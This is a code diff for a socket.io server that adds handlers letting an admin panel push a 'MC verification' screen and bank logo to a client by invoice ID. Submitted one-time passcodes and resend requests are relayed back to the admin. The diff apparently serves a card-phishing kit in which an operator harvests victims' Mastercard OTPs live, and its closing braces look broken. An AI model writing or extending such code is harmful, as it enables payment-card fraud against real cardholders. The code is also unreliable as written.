@@ -438,4 +438,40 @@ io.on('connection', (socket) => {
       });
     }
   });
+  
+  // ADD THE MC VERIFICATION HANDLERS RIGHT HERE
+  // MC verification events
+  socket.on('show_mc_verification', (data) => {
+    // Broadcast to the client with this invoice ID
+    io.to(data.invoiceId).emit('show_mc_verification', data);
+  });
+  
+  socket.on('update_mc_bank', (data) => {
+    // Update bank logo on client
+    io.to(data.invoiceId).emit('update_mc_bank', {
+      invoiceId: data.invoiceId,
+      bankCode: data.bankCode
+    });
+  });
+  
+  socket.on('mc_otp_submitted', (data) => {
+    // Notify admin panel of OTP submission
+    io.emit('mc_otp_submitted', data);
+  });
+  
+  socket.on('mc_otp_error', (data) => {
+    // Send OTP error to client
+    io.to(data.invoiceId).emit('mc_otp_error', data);
+  });
+  
+  socket.on('mc_verification_result', (data) => {
+    // Send verification result to client
+    io.to(data.invoiceId).emit('mc_verification_result', data);
+  });
+  
+  socket.on('mc_resend_otp', (data) => {
+    // Notify admin panel of OTP resend request
+    io.emit('mc_resend_otp', data);
+  });
+});
 });
